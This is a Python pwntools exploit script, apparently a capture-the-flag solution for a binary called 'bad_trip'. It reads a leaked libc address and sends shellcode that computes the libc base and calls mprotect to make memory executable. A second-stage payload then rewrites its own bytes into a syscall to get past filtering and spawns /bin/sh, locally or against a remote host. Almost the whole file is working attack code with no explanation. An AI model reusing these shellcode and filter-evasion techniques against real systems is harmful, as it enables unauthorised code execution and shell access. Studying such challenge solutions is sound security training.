#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('bad_trip')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *exec+71
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():
    mprotect = 0x2218b0
    rw_region = 0x6969696000
    sc_region = 0x1337131000

    start = 0x7f00
    offset_to_base = 0x77640
    # elf_header = 0x464c457f 

            # find:
            # xor rdx, rdx
            # mov r8, {leak}
            # mov r9, {offset_to_base}
            # mov rcx, 0x00
            # mov rdi, {start}
            # add rdi, rcx
            # shl rdi, 32
            # add rdi, r8
            # sub rdi, r9
            # mov edx, dword ptr [rdi]
            # cmp edx, {elf_header}
            # inc rcx
            # jne find
            # nop

    io.recvuntil("with ")
    leak = int(io.recvline().strip(), 16)
    info("puts dword leak: %#x", leak)

    sc = asm(f"""
        setup:
            mov r8, {leak}
            mov r9, {offset_to_base}
            movq rdi, xmm1
            shr rdi, 32
            shl rdi, 32
            add rdi, r8
            sub rdi, r9
            mov r11, rdi
            nop
            nop
        
        good_ret:
            mov rsp, {rw_region}
            lea r8, [rsp]
            mov r9, {sc_region}
            add r9, 0x100
            mov qword ptr [r8], r9
            nop

        mprotect:
            mov rdx, 7
            mov rsi, 0x1000
            mov rdi, {sc_region}
            mov rax, {mprotect}
            add rax, r11
            jmp rax
            nop
    """)

    stage2 = asm(f"""
        spawn:
            lea rdi, [rip+sh]
            xor rax, rax
            xor esi, esi
            xor edx, edx
            xor eax, eax
            mov al, 0x3b
            inc byte ptr [rip+x1+1]
    
        x1:
            .byte 0x0f, 0x04
        
        sh:
            .ascii "/bin/sh"
    """)

    pad = asm('nop')*0x100
    sc += pad
    sc += stage2

    io.send(sc)

    io.interactive()


def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()

